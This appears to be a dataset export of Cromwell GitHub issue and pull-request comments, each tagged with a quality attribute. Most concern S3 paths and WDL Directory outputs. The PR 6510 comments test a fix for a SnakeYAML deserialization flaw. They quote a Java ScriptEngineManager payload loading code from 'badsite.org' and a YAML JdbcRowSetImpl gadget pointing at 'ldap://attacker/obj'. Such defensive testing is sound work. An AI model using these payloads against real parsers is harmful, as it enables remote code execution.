https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:484,Testability,test,test,484,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:508,Testability,test,test,508,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231:29,Availability,error,error,29,"I was able to see the actual error message from CloudWatch logs. It seems that my Cromwell server instance got the same error as shown here, while on the instance automatically created by AWS Batch compute environment, errors were different in different jobs. So probably the Cromwell server is not the correct place for diagnosis. I'll just close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231:120,Availability,error,error,120,"I was able to see the actual error message from CloudWatch logs. It seems that my Cromwell server instance got the same error as shown here, while on the instance automatically created by AWS Batch compute environment, errors were different in different jobs. So probably the Cromwell server is not the correct place for diagnosis. I'll just close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231:219,Availability,error,errors,219,"I was able to see the actual error message from CloudWatch logs. It seems that my Cromwell server instance got the same error as shown here, while on the instance automatically created by AWS Batch compute environment, errors were different in different jobs. So probably the Cromwell server is not the correct place for diagnosis. I'll just close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231:35,Integrability,message,message,35,"I was able to see the actual error message from CloudWatch logs. It seems that my Cromwell server instance got the same error as shown here, while on the instance automatically created by AWS Batch compute environment, errors were different in different jobs. So probably the Cromwell server is not the correct place for diagnosis. I'll just close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231:59,Testability,log,logs,59,"I was able to see the actual error message from CloudWatch logs. It seems that my Cromwell server instance got the same error as shown here, while on the instance automatically created by AWS Batch compute environment, errors were different in different jobs. So probably the Cromwell server is not the correct place for diagnosis. I'll just close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-930634231
https://github.com/broadinstitute/cromwell/issues/6507#issuecomment-943935169:20,Deployability,release,release,20,It seems fixed with release 70,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6507#issuecomment-943935169
https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095:265,Availability,echo,echo,265,"Also, directories do not seem to work as workflow outputs. Even if the option:; ```; ""final_workflow_outputs_dir"": ""/file/path/output/"",; ```; Is active, `Directory` outputs are not copied to the final output directory. This example to reproduce the issue:; ```; $ echo 'version development. workflow main {; call main { input: s = ""f"" }; output { Directory d = main.d }; }. task main {; input {; String s; }. command <<<; set -euo pipefail; mkdir d; touch ""d/~{s}""; >>>. output {; Directory d = ""d""; }. runtime {; docker: ""debian:stable-slim""; }; }' > /tmp/main.wdl. $ echo '{; ""final_workflow_outputs_dir"": ""/tmp/outputs""; }' > /tmp/options.json. $ java -jar cromwell-69.jar run /tmp/main.wdl -o /tmp/options.json; ... $ ls /tmp/outputs/; ls: cannot access '/tmp/outputs/': No such file or directory; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095
https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095:570,Availability,echo,echo,570,"Also, directories do not seem to work as workflow outputs. Even if the option:; ```; ""final_workflow_outputs_dir"": ""/file/path/output/"",; ```; Is active, `Directory` outputs are not copied to the final output directory. This example to reproduce the issue:; ```; $ echo 'version development. workflow main {; call main { input: s = ""f"" }; output { Directory d = main.d }; }. task main {; input {; String s; }. command <<<; set -euo pipefail; mkdir d; touch ""d/~{s}""; >>>. output {; Directory d = ""d""; }. runtime {; docker: ""debian:stable-slim""; }; }' > /tmp/main.wdl. $ echo '{; ""final_workflow_outputs_dir"": ""/tmp/outputs""; }' > /tmp/options.json. $ java -jar cromwell-69.jar run /tmp/main.wdl -o /tmp/options.json; ... $ ls /tmp/outputs/; ls: cannot access '/tmp/outputs/': No such file or directory; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095
https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095:752,Security,access,access,752,"Also, directories do not seem to work as workflow outputs. Even if the option:; ```; ""final_workflow_outputs_dir"": ""/file/path/output/"",; ```; Is active, `Directory` outputs are not copied to the final output directory. This example to reproduce the issue:; ```; $ echo 'version development. workflow main {; call main { input: s = ""f"" }; output { Directory d = main.d }; }. task main {; input {; String s; }. command <<<; set -euo pipefail; mkdir d; touch ""d/~{s}""; >>>. output {; Directory d = ""d""; }. runtime {; docker: ""debian:stable-slim""; }; }' > /tmp/main.wdl. $ echo '{; ""final_workflow_outputs_dir"": ""/tmp/outputs""; }' > /tmp/options.json. $ java -jar cromwell-69.jar run /tmp/main.wdl -o /tmp/options.json; ... $ ls /tmp/outputs/; ls: cannot access '/tmp/outputs/': No such file or directory; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-934499095
https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-936922021:127,Security,access,access,127,"Unfortunately the `Directory` type is a feature of a not-currently-supported WDL version. . You can probably get preview-level access to this via `version development` but I certainly wouldn’t rely on features there yet. They might change - or disappear completely - as part of development of WDL 1.1 and subsequent version. In fact, WDL 1.1 explicitly does NOT include the `Directory` type so even the current level of support may be temporarily removed in future versions of Cromwell, until we start development on a version of WDL which does include the type. The good news is that if and when we do officially support the `Directory` type in that future version of WDL, we will support proper handling of the type, including call caching, but the bad news is that it’s not an active development priority right now, so I can’t give you a proper timeline for support. Sorry!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-936922021
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:205,Performance,load,loading,205,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:49,Safety,Safe,SafeConstructor,49,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:974,Security,attack,attacker,974,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:550,Testability,test,test,550,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:346,Availability,error,error,346,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:775,Availability,Down,Downloads,775,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:1129,Deployability,release,release,1129,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:590,Integrability,message,messages,590,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:153,Safety,Safe,SafeConstructor,153,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:203,Security,expose,exposed,203,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:514,Security,attack,attacker,514,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:637,Security,access,access,637,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194
